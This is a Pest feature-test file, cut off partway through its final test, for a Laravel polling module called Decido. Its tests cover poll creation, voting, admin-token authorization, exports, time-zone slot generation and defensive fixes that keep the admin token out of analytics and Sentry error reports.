<?php

/**
 * @author  MEMORA solutions <info@memora.ca> (https://memora.solutions)
 *
 * @project memora/laravel-saas-boilerplate
 *
 * Tests Pest — module Decido (sondages collectifs type Framadate amélioré).
 * Pattern calqué sur Modules\Books\Tests\Feature\BooksLibraryTest.
 */

declare(strict_types=1);

use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Str;
use Modules\Decido\Models\Poll;
use Modules\Decido\Models\PollOption;
use Modules\Decido\Models\PollVote;
use Modules\Decido\Services\PollExportService;
use Modules\Decido\Services\SlotGenerationService;

uses(Tests\TestCase::class);
uses(RefreshDatabase::class);

beforeEach(function (): void {
    $this->seed(\Database\Seeders\RolesAndPermissionsSeeder::class);

    $this->superadmin = User::factory()->create([
        'email' => config('app.superadmin_email'),
    ]);
    $this->superadmin->assignRole('super_admin');

    config()->set('decido.under_construction', true);
});

function decidoCreatePoll(array $overrides = []): Poll
{
    $poll = new Poll;
    $poll->title = $overrides['title'] ?? 'Sondage de test';
    $poll->type = $overrides['type'] ?? 'classic';
    $poll->vote_mode = $overrides['vote_mode'] ?? 'single_choice';
    $poll->timezone = $overrides['timezone'] ?? 'America/Toronto';
    $poll->status = $overrides['status'] ?? 'open';
    $poll->creator_id = $overrides['creator_id'] ?? User::factory()->create()->id;
    $poll->admin_token_hash = hash('sha256', $overrides['admin_token'] ?? 'plain-admin-token');

    if (isset($overrides['final_option_id'])) {
        $poll->final_option_id = $overrides['final_option_id'];
    }

    $poll->save();

    return $poll;
}

// ── Gate under_construction ────────────────────────────────────────────────

test('guest sur /decido/creer est redirigé vers la connexion (auth requise avant même le gate)', function (): void {
    // `auth` s'exécute avant le gate under_construction pour cette route (Laravel réordonne
    // les middlewares selon $middlewarePriority) : un guest est redirigé au login, jamais 503
    // directement. Le vrai périmètre de sécurité (bloquer les non-superadmin) est prouvé par
    // le test suivant (utilisateur CONNECTÉ non-superadmin → 503).
    $this->get(route('decido.create'))->assertRedirect();
});

test('utilisateur connecté non-superadmin reçoit aussi 503 (seul superadmin bypass)', function (): void {
    $user = User::factory()->create();

    $this->actingAs($user)->get(route('decido.create'))->assertStatus(503);
});

test('superadmin voit la liste des sondages (200)', function (): void {
    $this->actingAs($this->superadmin)->get(route('decido.index'))->assertStatus(200);
});

test('superadmin voit l’assistant de création (200)', function (): void {
    $this->actingAs($this->superadmin)->get(route('decido.create'))->assertStatus(200);
});

test('la liste "Mes sondages" contient un lien Gérer fonctionnel (owner-bypass, sans jeton valide)', function (): void {
    // Round 4 adversarial : authorizeManage() a toujours un bypass propriétaire (Auth::id() ===
    // creator_id) mais aucune vue ne générait de lien l'utilisant - impasse UX pour le créateur
    // qui n'a plus son jeton admin. Le lien utilise un jeton placeholder, invalide en tant que
    // tel, mais accepté car l'utilisateur connecté est bien le créateur du sondage.
    $poll = decidoCreatePoll(['creator_id' => $this->superadmin->id]);

    $indexResponse = $this->actingAs($this->superadmin)->get(route('decido.index'));
    $indexResponse->assertStatus(200);
    $indexResponse->assertSee(route('decido.manage', ['poll' => $poll->public_id, 'adminToken' => 'proprietaire']), false);

    $this->actingAs($this->superadmin)
        ->get(route('decido.manage', ['poll' => $poll->public_id, 'adminToken' => 'proprietaire']))
        ->assertStatus(200);
});

// ── Création ────────────────────────────────────────────────────────────────

test('superadmin peut créer un sondage de dates', function (): void {
    $futureDate = now()->addDays(10)->format('Y-m-d');

    $response = $this->actingAs($this->superadmin)->post(route('decido.store'), [
        'title' => 'Réunion équipe',
        'type' => 'date',
        'timezone' => 'America/Toronto',
        'duration_minutes' => 30,
        'range_start_time' => '09:00',
        'range_end_time' => '10:30',
        'step_minutes' => 30,
        'candidate_dates' => [$futureDate],
    ]);

    $poll = Poll::where('title', 'Réunion équipe')->first();

    expect($poll)->not->toBeNull();
    $response->assertRedirect(route('decido.manage', ['poll' => $poll->public_id, 'adminToken' => $response->getSession()->get('admin_token_plain') ?? '']));

    $this->assertSame('open', $poll->status->value);
    $this->assertGreaterThan(0, $poll->options()->count());
    $this->assertNotNull($poll->options()->first()->starts_at);
    $this->assertNotNull($poll->options()->first()->ends_at);

    // Les paramètres de génération de créneaux doivent être persistés sur le sondage lui-même
    // (pas seulement utilisés en mémoire par SlotGenerationService), pour toute fonctionnalité
    // future de modification/régénération - trouvé NULL en base par une passe adversariale.
    $poll = $poll->fresh();
    $this->assertSame(30, $poll->duration_minutes);
    $this->assertSame('09:00', $poll->range_start_time);
    $this->assertSame('10:30', $poll->range_end_time);
    $this->assertSame(30, $poll->step_minutes);
});

test('superadmin peut créer un sondage classique', function (): void {
    $response = $this->actingAs($this->superadmin)->post(route('decido.store'), [
        'title' => 'Choix du resto',
        'type' => 'classic',
        'timezone' => 'America/Toronto',
        'vote_mode' => 'single_choice',
        'options' => ['Pizza', 'Sushi'],
    ]);

    $poll = Poll::where('title', 'Choix du resto')->first();

    expect($poll)->not->toBeNull();
    $response->assertStatus(302);

    $this->assertSame(2, $poll->options()->count());
    $this->assertNull($poll->options()->first()->starts_at);
    $this->assertNull($poll->options()->first()->ends_at);
});

test('création sans titre retourne une erreur de validation, pas une exception', function (): void {
    $response = $this->actingAs($this->superadmin)->post(route('decido.store'), [
        'type' => 'classic',
        'timezone' => 'America/Toronto',
        'vote_mode' => 'single_choice',
        'options' => ['Pizza', 'Sushi'],
    ]);

    $response->assertStatus(302);
    $response->assertSessionHasErrors('title');
});

test('61 dates candidates dépasse le plafond de validation (max:60)', function (): void {
    // Round 9 (skill /100) : aucune borne n'existait sur candidate_dates, contrairement au type
    // classique déjà plafonné à 20 options.
    $dates = collect(range(1, 61))->map(fn ($i) => now()->addDays($i)->format('Y-m-d'))->all();

    $response = $this->actingAs($this->superadmin)->post(route('decido.store'), [
        'title' => 'Sondage trop de dates',
        'type' => 'date',
        'timezone' => 'America/Toronto',
        'duration_minutes' => 30,
        'range_start_time' => '09:00',
        'range_end_time' => '10:00',
        'step_minutes' => 30,
        'candidate_dates' => $dates,
    ]);

    $response->assertSessionHasErrors('candidate_dates');
    expect(Poll::where('title', 'Sondage trop de dates')->exists())->toBeFalse();
});

test('un volume total de créneaux excessif (>500) est refusé même sous 60 dates candidates', function (): void {
    // Round 9 (skill /100) : 60 dates x plage large x pas court peut encore générer des
    // centaines de créneaux par date - le plafond de dates seul ne suffit pas. 3800 créneaux
    // créés en test réel avant ce fix (40 dates x plage 00:00-23:45 x pas 15 min).
    config()->set('decido.under_construction', false);
    $dates = collect(range(1, 30))->map(fn ($i) => now()->addDays($i)->format('Y-m-d'))->all();

    $response = $this->actingAs($this->superadmin)->post(route('decido.store'), [
        'title' => 'Sondage volume excessif',
        'type' => 'date',
        'timezone' => 'America/Toronto',
        'duration_minutes' => 15,
        'range_start_time' => '00:00',
        'range_end_time' => '23:45',
        'step_minutes' => 15,
        'candidate_dates' => $dates,
    ]);

    $response->assertSessionHasErrors('candidate_dates');
    expect(Poll::where('title', 'Sondage volume excessif')->exists())->toBeFalse();
});

test('soumettre deux fois la même date candidate est rejeté (distinct) au lieu de créer des créneaux dupliqués', function (): void {
    // Round 11 (skill /100) : avant le fix, cette requête créait le sondage avec DEUX jeux de
    // créneaux strictement identiques pour la même date (labels et starts_at/ends_at
    // identiques), scindant silencieusement les votes entre deux PollOption distinctes.
    config()->set('decido.under_construction', false);
    $futureDate = now()->addDays(10)->format('Y-m-d');

    $response = $this->actingAs($this->superadmin)->post(route('decido.store'), [
        'title' => 'Sondage date dupliquée',
        'type' => 'date',
        'timezone' => 'America/Toronto',
        'duration_minutes' => 30,
        'range_start_time' => '09:00',
        'range_end_time' => '10:00',
        'step_minutes' => 30,
        'candidate_dates' => [$futureDate, $futureDate],
    ]);

    $response->assertSessionHasErrors('candidate_dates.0');
    expect(Poll::where('title', 'Sondage date dupliquée')->exists())->toBeFalse();
});

test('soumettre deux options classiques au libellé identique est rejeté (distinct) au lieu de scinder les votes', function (): void {
    // Round 11 (skill /100) : même faille pour le type classique - "Pizza"/"Pizza" créait deux
    // PollOption distinctes, chacune accumulant sa propre part des votes séparément.
    config()->set('decido.under_construction', false);

    $response = $this->actingAs($this->superadmin)->post(route('decido.store'), [
        'title' => 'Sondage option dupliquée',
        'type' => 'classic',
        'timezone' => 'America/Toronto',
        'vote_mode' => 'single_choice',
        'options' => ['Pizza', 'Pizza'],
    ]);

    $response->assertSessionHasErrors('options.0');
    expect(Poll::where('title', 'Sondage option dupliquée')->exists())->toBeFalse();
});

// ── Vote public ─────────────────────────────────────────────────────────────

test('votant anonyme peut voir un sondage ouvert', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['type' => 'classic', 'vote_mode' => 'single_choice']);
    PollOption::factory()->create(['poll_id' => $poll->id]);

    $this->get(route('decido.vote.show', ['slug' => $poll->public_id]))->assertStatus(200);
});

test('les pages privées Décido (vote, résultats, Mes sondages, création) déclarent page_noindex', function (): void {
    // Round 10 (skill /100) : aucune vue Décido ne déclarait @section('page_noindex') - une fois
    // le module public (DECIDO_UNDER_CONSTRUCTION=false), les pages contenant des données privées
    // (pseudonymes/choix de vote) auraient été indexables par défaut. Preuve HTTP réelle : la
    // balise <meta name="robots"> ne passe en "noindex, follow" que si la section est déclarée
    // (Modules/FrontTheme/resources/views/layouts/master.blade.php:13, View::hasSection()).
    config()->set('decido.under_construction', false);
    config()->set('app.noindex', false);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-noindex', 'type' => 'classic', 'vote_mode' => 'single_choice']);
    PollOption::factory()->create(['poll_id' => $poll->id]);

    $voteHtml = $this->get(route('decido.vote.show', ['slug' => $poll->public_id]))->getContent();
    $this->assertStringContainsString('name="robots" content="noindex', $voteHtml);

    $resultsHtml = $this->get(route('decido.manage', ['poll' => $poll->public_id, 'adminToken' => 'jeton-noindex']))->getContent();
    $this->assertStringContainsString('name="robots" content="noindex', $resultsHtml);

    $indexHtml = $this->actingAs($this->superadmin)->get(route('decido.index'))->getContent();
    $this->assertStringContainsString('name="robots" content="noindex', $indexHtml);

    $createHtml = $this->actingAs($this->superadmin)->get(route('decido.create'))->getContent();
    $this->assertStringContainsString('name="robots" content="noindex', $createHtml);
});

test('la page de gestion (jeton admin dans l’URL) ne transmet pas ce jeton à Google Analytics (no_analytics)', function (): void {
    // Round 12 (skill /100) : le jeton admin (contrôle total du sondage - clôture, export des
    // pseudonymes des votants, lien court) transite EN CLAIR dans le chemin de l'URL
    // (/decido/{poll}/gerer/{adminToken}). Le layout global (master.blade.php) charge GA4 avec
    // send_page_view:true sur toute page ne déclarant PAS @section('no_analytics') - le hit GA4
    // capture automatiquement page_location = window.location.href, donc sans ce gate, le jeton
    // admin était transmis à Google (tiers) et stocké indéfiniment dans la propriété GA4 à chaque
    // chargement (visite initiale, rafraîchissement, redirection post-clôture/lien court). Le
    // round 10 avait bloqué l'indexation (page_noindex) mais pas ce vecteur de fuite distinct.
    config()->set('decido.under_construction', false);
    config()->set('services.ga.measurement_id', 'G-TESTFAKE123');
    config()->set('services.ga.privacy_enabled', true);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-ga4-leak']);
    PollOption::factory()->create(['poll_id' => $poll->id]);

    $manageHtml = $this->get(route('decido.manage', ['poll' => $poll->public_id, 'adminToken' => 'jeton-ga4-leak']))->getContent();
    $this->assertStringNotContainsString('googletagmanager.com', $manageHtml);

    // Contrôle négatif : prouve que le gate GA4 est réellement actif dans cet environnement de
    // test (sinon l'assertion précédente passerait trivialement même sans le correctif) - une
    // page Décido dont l'URL propre ne porte aucun jeton (index, pas de no_analytics déclaré)
    // charge bien GA4 normalement.
    $indexHtml = $this->actingAs($this->superadmin)->get(route('decido.index'))->getContent();
    $this->assertStringContainsString('googletagmanager.com', $indexHtml);
});

test('le jeton admin Décido dans l’URL est filtré avant tout envoi vers Sentry (before_send)', function (): void {
    // Round 13 (skill /100) : Sentry\Integration\RequestIntegration capture INCONDITIONNELLEMENT
    // l'URL complète de la requête (event.request.url), même avec send_default_pii=false (ce
    // flag ne protège que cookies/headers/IP, jamais l'URL - vérifié dans le code source du SDK,
    // vendor/sentry/sentry/src/Integration/RequestIntegration.php:129). La moindre exception
    // levée pendant le traitement d'une requête /decido/{poll}/gerer/{adminToken}(/...) aurait
    // donc envoyé le jeton admin (contrôle total du sondage) en clair vers Sentry, un tiers hors
    // UE. Correctif : config/sentry.php 'before_send' branché sur SentryUrlScrubber, qui
    // s'exécute (prouvé par Client::prepareEvent()) APRÈS que RequestIntegration a rempli
    // request.url mais AVANT l'envoi au transport - la fenêtre exacte pour scruber sans rien
    // casser d'autre. Même famille de fuite que le round 12 (GA4), angle distinct (télémétrie
    // d'erreurs serveur, pas analytics navigateur).
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-secret-sentry']);

    $url = route('decido.manage', ['poll' => $poll->public_id, 'adminToken' => 'jeton-secret-sentry']);
    expect($url)->toContain('jeton-secret-sentry');

    $beforeSend = config('sentry.before_send');
    expect($beforeSend)->toBeCallable();

    $event = \Sentry\Event::createEvent();
    $event->setRequest(['url' => $url, 'method' => 'GET']);

    $scrubbed = $beforeSend($event, null);

    expect($scrubbed)->not->toBeNull();
    $scrubbedUrl = $scrubbed->getRequest()['url'];
    expect($scrubbedUrl)->not->toContain('jeton-secret-sentry');
    expect($scrubbedUrl)->toContain('/gerer/[jeton-filtre]');
});

test('SentryUrlScrubber préserve le chemin après le jeton admin (fermer/export/qr non tronqués)', function (): void {
    // Preuve que le scrub ne consomme QUE le segment du jeton, pas les sous-routes de gestion
    // qui suivent dans le chemin (fermer, export.csv, export.ics, lien-court, qr.png).
    $scrubbed = \Modules\Core\Services\SentryUrlScrubber::scrubUrl(
        'https://laveille.ai/decido/abc123def456/gerer/SUPERSECRETTOKEN1234567890/export.csv?foo=bar'
    );

    expect($scrubbed)
        ->toBe('https://laveille.ai/decido/abc123def456/gerer/[jeton-filtre]/export.csv?foo=bar')
        ->not->toContain('SUPERSECRETTOKEN1234567890');

    // Contrôle négatif : une URL Décido sans jeton (page publique de vote) n'est pas altérée.
    $publicUrl = 'https://laveille.ai/decido/abc123def456';
    expect(\Modules\Core\Services\SentryUrlScrubber::scrubUrl($publicUrl))->toBe($publicUrl);
});

test('votant anonyme peut voter (yes_no_maybe)', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['type' => 'date', 'vote_mode' => 'yes_no_maybe']);
    $option = PollOption::factory()->create(['poll_id' => $poll->id]);

    $this->post(route('decido.vote.store', ['slug' => $poll->public_id]), [
        'voter_pseudonym' => 'Alice',
        'votes' => [$option->id => 'yes'],
    ]);

    $this->assertDatabaseHas('decido_poll_votes', [
        'poll_id' => $poll->id,
        'option_id' => $option->id,
        'voter_pseudonym' => 'Alice',
        'value' => 'yes',
    ]);
});

test('le même votant qui revote met à jour son vote sans le dupliquer', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['type' => 'date', 'vote_mode' => 'yes_no_maybe']);
    $option = PollOption::factory()->create(['poll_id' => $poll->id]);

    $cookieName = 'decido_voter_'.$poll->public_id;

    $first = $this->post(route('decido.vote.store', ['slug' => $poll->public_id]), [
        'voter_pseudonym' => 'Bob',
        'votes' => [$option->id => 'yes'],
    ]);

    // TestResponse::getCookie() déchiffre automatiquement (2e argument $decrypt = true par
    // défaut) - withCookie() re-chiffrera cette valeur brute pour simuler un aller-retour
    // navigateur normal.
    $voterToken = $first->getCookie($cookieName)->getValue();

    $this->withCookie($cookieName, $voterToken)->post(route('decido.vote.store', ['slug' => $poll->public_id]), [
        'voter_pseudonym' => 'Bob',
        'votes' => [$option->id => 'no'],
    ]);

    $this->assertSame(1, PollVote::where('option_id', $option->id)->count());
    $this->assertDatabaseHas('decido_poll_votes', [
        'option_id' => $option->id,
        'value' => 'no',
    ]);
});

test('voter sur un sondage fermé retourne 404', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['type' => 'classic', 'vote_mode' => 'single_choice', 'status' => 'closed']);
    $option = PollOption::factory()->create(['poll_id' => $poll->id]);

    $this->post(route('decido.vote.store', ['slug' => $poll->public_id]), [
        'voter_pseudonym' => 'Charlie',
        'votes' => (string) $option->id,
    ])->assertNotFound();
});

// ── Administration via lien admin ────────────────────────────────────────────

test('accès à la gestion avec un mauvais jeton admin retourne 403', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'le-vrai-jeton']);

    $this->get(route('decido.manage', ['poll' => $poll->public_id, 'adminToken' => 'mauvais-jeton']))
        ->assertForbidden();
});

test('accès à la gestion avec le bon jeton admin fonctionne sans compte connecté', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'le-vrai-jeton']);
    PollOption::factory()->create(['poll_id' => $poll->id]);

    $this->get(route('decido.manage', ['poll' => $poll->public_id, 'adminToken' => 'le-vrai-jeton']))
        ->assertStatus(200);
});

// ── Intégration ShortUrl / QR code ──────────────────────────────────────────

test('créer un lien court associe un short_url_id au sondage et affiche le lien court', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-shortlink']);
    PollOption::factory()->create(['poll_id' => $poll->id]);

    $this->post(route('decido.shortlink', ['poll' => $poll->public_id, 'adminToken' => 'jeton-shortlink']))
        ->assertRedirect(route('decido.manage', ['poll' => $poll->public_id, 'adminToken' => 'jeton-shortlink']));

    $poll->refresh();
    expect($poll->short_url_id)->not->toBeNull();
    expect($poll->getShortUrlString())->not->toBeNull();

    $this->get(route('decido.manage', ['poll' => $poll->public_id, 'adminToken' => 'jeton-shortlink']))
        ->assertStatus(200)
        ->assertSee($poll->getShortUrlString(), escape: false);
});

test('Poll::getShortUrlString() ne ré-interroge pas la DB à chaque appel (fix N+1 round 7)', function (): void {
    // Round 7 adversarial (skill /100) : ::find() brut à chaque appel générait 3 requêtes
    // short_urls redondantes par chargement de results.blade.php (3 appels dans la vue).
    // $this->shortUrl (relation Eloquent) est mis en cache après le premier accès.
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-n1']);
    PollOption::factory()->create(['poll_id' => $poll->id]);
    $this->post(route('decido.shortlink', ['poll' => $poll->public_id, 'adminToken' => 'jeton-n1']));
    $poll->refresh();

    \Illuminate\Support\Facades\DB::enableQueryLog();
    $poll->getShortUrlString();
    $poll->getShortUrlString();
    $poll->getShortUrlString();
    $shortUrlQueries = collect(\Illuminate\Support\Facades\DB::getQueryLog())
        ->filter(fn ($q) => str_contains($q['query'], 'short_urls'));
    \Illuminate\Support\Facades\DB::disableQueryLog();

    expect($shortUrlQueries)->toHaveCount(1);
});

test('supprimer le compte créateur orpheline le sondage au lieu de le supprimer en cascade', function (): void {
    // Décision utilisateur (2026-07-16) : cascadeOnDelete détruisait intégralement un sondage
    // (créneaux + TOUS les votes de tiers) dès que le créateur supprimait son compte, sans
    // préavis possible pour les votants anonymes. Remplacé par nullOnDelete (orphelinage).
    $creator = User::factory()->create();
    $poll = decidoCreatePoll(['creator_id' => $creator->id, 'admin_token' => 'jeton-orphelin']);
    $option = $poll->options()->create(['label' => 'Option A', 'sort_order' => 0]);
    $option->votes()->create([
        'poll_id' => $poll->id,
        'voter_token' => 'token-tiers',
        'voter_pseudonym' => 'Un tiers',
        'value' => 'selected',
    ]);

    $creator->delete();

    $poll->refresh();
    expect($poll)->not->toBeNull();
    expect($poll->creator_id)->toBeNull();
    expect($poll->options()->count())->toBe(1);
    expect($option->fresh()->votes()->count())->toBe(1);
});

test('deux votants homonymes (même pseudonyme, voter_token différents) ne sont pas fusionnés dans les résultats', function (): void {
    // Round 6 adversarial (skill /100) : avant le fix, totalVoters/voterNames/matrix étaient
    // clés par voter_pseudonym (texte libre) au lieu de voter_token (identifiant réel) - un
    // deuxième votant "Marie" écrasait silencieusement le vote du premier "Marie".
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-homonymes', 'vote_mode' => 'single_choice']);
    $option = $poll->options()->create(['label' => 'Option A', 'sort_order' => 0]);
    PollOption::factory()->create(['poll_id' => $poll->id, 'label' => 'Option B', 'sort_order' => 1]);

    $option->votes()->create([
        'poll_id' => $poll->id,
        'voter_token' => 'token-marie-1',
        'voter_pseudonym' => 'Marie',
        'value' => 'selected',
    ]);
    $option->votes()->create([
        'poll_id' => $poll->id,
        'voter_token' => 'token-marie-2',
        'voter_pseudonym' => 'Marie',
        'value' => 'selected',
    ]);

    $response = $this->get(route('decido.manage', ['poll' => $poll->public_id, 'adminToken' => 'jeton-homonymes']));

    $response->assertStatus(200);
    $response->assertSee('2 participant(s)', false);
    // Les 2 votes doivent apparaître dans le total, pas être écrasés à 1.
    $response->assertSee('✓ 2 sur 2 participants', false);
});

test('demander un lien court deux fois ne crée pas deux short_url distincts', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-shortlink-2']);
    PollOption::factory()->create(['poll_id' => $poll->id]);

    $this->post(route('decido.shortlink', ['poll' => $poll->public_id, 'adminToken' => 'jeton-shortlink-2']));
    $poll->refresh();
    $firstShortUrlId = $poll->short_url_id;

    $this->post(route('decido.shortlink', ['poll' => $poll->public_id, 'adminToken' => 'jeton-shortlink-2']));
    $poll->refresh();

    expect($poll->short_url_id)->toBe($firstShortUrlId);
});

test('un jeton admin invalide ne peut pas créer de lien court (403)', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'le-vrai-jeton-3']);
    PollOption::factory()->create(['poll_id' => $poll->id]);

    $this->post(route('decido.shortlink', ['poll' => $poll->public_id, 'adminToken' => 'mauvais-jeton']))
        ->assertStatus(403);
});

test('le QR code du sondage renvoie une image PNG valide', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-qr']);
    PollOption::factory()->create(['poll_id' => $poll->id]);

    $response = $this->get(route('decido.qr', ['poll' => $poll->public_id, 'adminToken' => 'jeton-qr']));

    $response->assertStatus(200);
    $response->assertHeader('Content-Type', 'image/png');
    expect(substr($response->getContent(), 0, 8))->toBe("\x89PNG\r\n\x1a\n");
});

// ── Exports ───────────────────────────────────────────────────────────────

test('export CSV disponible en tout temps', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-csv']);
    PollOption::factory()->create(['poll_id' => $poll->id]);

    $response = $this->get(route('decido.export.csv', ['poll' => $poll->public_id, 'adminToken' => 'jeton-csv']));

    $response->assertStatus(200);
    $this->assertStringContainsString('text/csv', $response->headers->get('Content-Type'));
});

test('export ICS refusé si le sondage n’est pas fermé', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-ics', 'status' => 'open']);

    $response = $this->get(route('decido.export.ics', ['poll' => $poll->public_id, 'adminToken' => 'jeton-ics']));

    $response->assertRedirect();
    $response->assertSessionHasErrors('export');
});

test('export ICS disponible après clôture avec créneau final', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-ics-2', 'type' => 'date', 'status' => 'closed']);
    $option = PollOption::factory()->create([
        'poll_id' => $poll->id,
        'starts_at' => now()->addDay(),
        'ends_at' => now()->addDay()->addMinutes(30),
    ]);
    $poll->final_option_id = $option->id;
    $poll->save();

    $response = $this->get(route('decido.export.ics', ['poll' => $poll->public_id, 'adminToken' => 'jeton-ics-2']));

    $response->assertStatus(200);
    $this->assertStringContainsString('text/calendar', $response->headers->get('Content-Type'));
});

test('le DTSTART de l’export ICS reflète l’heure UTC réelle, pas un fuseau mal interprété', function (): void {
    // Reproduit le stockage réel de SlotGenerationService : starts_at/ends_at écrits en UTC
    // brut. config('app.timezone') = America/Toronto fait que le cast Eloquent datetime, à la
    // relecture depuis la DB (d'où le fresh() ci-dessous, indispensable pour déclencher le bug),
    // réinterprète cette valeur comme si elle était déjà en heure de Québec sans la convertir.
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-ics-tz', 'type' => 'date', 'status' => 'closed']);
    $option = PollOption::factory()->create([
        'poll_id' => $poll->id,
        'starts_at' => \Carbon\Carbon::create(2026, 8, 1, 13, 0, 0, 'UTC'),
        'ends_at' => \Carbon\Carbon::create(2026, 8, 1, 14, 0, 0, 'UTC'),
    ]);
    $poll->final_option_id = $option->id;
    $poll->save();
    $poll = $poll->fresh(['options']);

    $response = $this->get(route('decido.export.ics', ['poll' => $poll->public_id, 'adminToken' => 'jeton-ics-tz']));

    $response->assertStatus(200);
    $this->assertStringContainsString('DTSTART:20260801T130000Z', $response->getContent());
    $this->assertStringContainsString('DTEND:20260801T140000Z', $response->getContent());
});

test('l’export ICS plie les lignes trop longues conformément à RFC 5545 (aucune ligne > 75 octets)', function (): void {
    // Round 9 (skill /100) : aucun pliage de ligne n'existait - un titre long/unicode produisait
    // une ligne SUMMARY de plusieurs centaines d'octets, dépassant largement la limite RFC 5545
    // §3.1 (75 octets/ligne), risquant une troncature par des lecteurs de calendrier stricts.
    $longTitle = str_repeat('Réunion café ☕ São Paulo 🎉 ', 6); // > 75 octets une fois encodé UTF-8, < 255 caractères
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-ics-fold', 'type' => 'date', 'status' => 'closed', 'title' => $longTitle]);
    $option = PollOption::factory()->create([
        'poll_id' => $poll->id,
        'starts_at' => \Carbon\Carbon::create(2026, 8, 1, 13, 0, 0, 'UTC'),
        'ends_at' => \Carbon\Carbon::create(2026, 8, 1, 14, 0, 0, 'UTC'),
    ]);
    $poll->final_option_id = $option->id;
    $poll->save();
    $poll = $poll->fresh(['options']);

    $response = $this->get(route('decido.export.ics', ['poll' => $poll->public_id, 'adminToken' => 'jeton-ics-fold']));
    $response->assertStatus(200);

    foreach (explode("\r\n", $response->getContent()) as $physicalLine) {
        $this->assertLessThanOrEqual(75, strlen($physicalLine), "Ligne ICS physique > 75 octets : {$physicalLine}");
    }

    // Le titre complet doit rester reconstituable en dépliant (retirer CRLF + espace de continuation).
    $unfolded = str_replace("\r\n ", '', $response->getContent());
    $this->assertStringContainsString($longTitle, $unfolded);
});

// ── Clôture ───────────────────────────────────────────────────────────────

test('clôturer un sondage avec un créneau final fonctionne', function (): void {
    config()->set('decido.under_construction', false);
    $poll = decidoCreatePoll(['admin_token' => 'jeton-close']);
    $option = PollOption::factory()->create(['poll_id' => $poll->id]);

    $this->post(route('decido.close', ['poll' => $poll->public_id, 'adminToken' => 'jeton-close']), [
        'final_option_id' => $option->id,
    ]);

    $poll->refresh();
    $this->assertSame('closed', $poll->status->value);
    $this->assertSame($option->id, $poll->final_option_id);
});

// ── Service de génération de créneaux ────────────────────────────────────────

test('le service de créneaux calcule le bon nombre pour une plage donnée', function (): void {
    $service = new SlotGenerationService;
    $futureDate = now()->addDays(5)->format('Y-m-d');

    $slots = $service->generateSlots([$futureDate], '09:00', '11:00', 45, 30, 'America/Toronto');

    $this->assertSame(3, count($slots));
});

test('le service de créneaux lève une exception si la plage horaire est inversée', function (): void {
    $service = new SlotGenerationService;
    $futureDate = now()->addDays(5)->format('Y-m-d');

    $this->expectException(InvalidArgumentException::class);
    $service->generateSlots([$futureDate], '11:00', '09:00', 30, 30, 'America/Toronto');
});

test('les créneaux traversant le passage à l’heure d’été durent exactement la durée configurée', function (): void {
    // Round 8 (skill /100) : l'ancienne implémentation additionnait des minutes sur une instance
    // Carbon localisée (America/Toronto) - le 8 mars 2026 (passage à l'heure d'été, 02h00-02h59
    // n'existe pas localement), un créneau de 30 min démarrant à 01h30 durait en réalité 90 min
    // une fois relu (l'addition sautait silencieusement l'heure inexistante). L'arithmétique se
    // fait désormais en UTC (pas de DST), garantissant une durée exacte quel que soit le jour.
    $service = new SlotGenerationService;

    $slots = $service->generateSlots(['2026-03-08'], '01:00', '04:00', 30, 30, 'America/Toronto');

    foreach ($slots as $slot) {
        $this->assertSame(
            30,
            (int) $slot['starts_at']->diffInMinutes($slot['ends_at']),
            "Le créneau {$slot['label']} ne dure pas 30 minutes exactement."
        );
    }
});

test('les créneaux ambigus au retour à l’heure normale sont désambiguïsés dans leur libellé', function (): void {
    // Round 8 (skill /100) : le 1er novembre 2026 (retour à l'heure normale), l'heure locale
    // 01h00-01h59 se produit deux fois - deux créneaux UTC distincts généraient auparavant un
    // libellé strictement identique, rendant impossible pour un votant de distinguer les deux
    // options. Le service ajoute désormais le décalage UTC en désambiguïsation sur collision.
    $service = new SlotGenerationService;

    $slots = $service->generateSlots(['2026-11-01'], '00:00', '03:00', 30, 30, 'America/Toronto');

    $labels = array_column($slots, 'label');
    $this->assertSame($labels, array_unique($labels), 'Deux créneaux partagent un libellé identique.');
});

test('Poll::shortUrl()/getShortUrlString() utilisent ModuleChecker (pas class_exists seul)', function (): void {
    // Round 8 (skill /100) : class_exists() reste vrai même module désactivé via
    // modules_statuses.json (nwidart garde les classes en autoload, seul le boot du
    // ServiceProvider est coupé) - un lien court "fantôme" pouvait être créé/affiché sans
    // avertissement (routes ShortUrl jamais enregistrées → 404 réel). ModuleChecker vérifie en
    // plus Module::has()/isEnabled(), le vrai état d'activation. Ce test prouve que le mécanisme
    // ModuleChecker::isAvailable() détecte correctement un module réellement absent/désactivé
    // (impossible de mocker un module tiers réel sans toucher au modules_statuses.json global,
    // ce qui romprait l'isolation des tests) et que le module ShortUrl, lui, est bien détecté
    // disponible en conditions normales (déjà prouvé par les tests de lien court ci-dessus).
    expect(\Modules\Core\Services\ModuleChecker::isAvailable('UnModuleQuiNexistePas'))->toBeFalse();
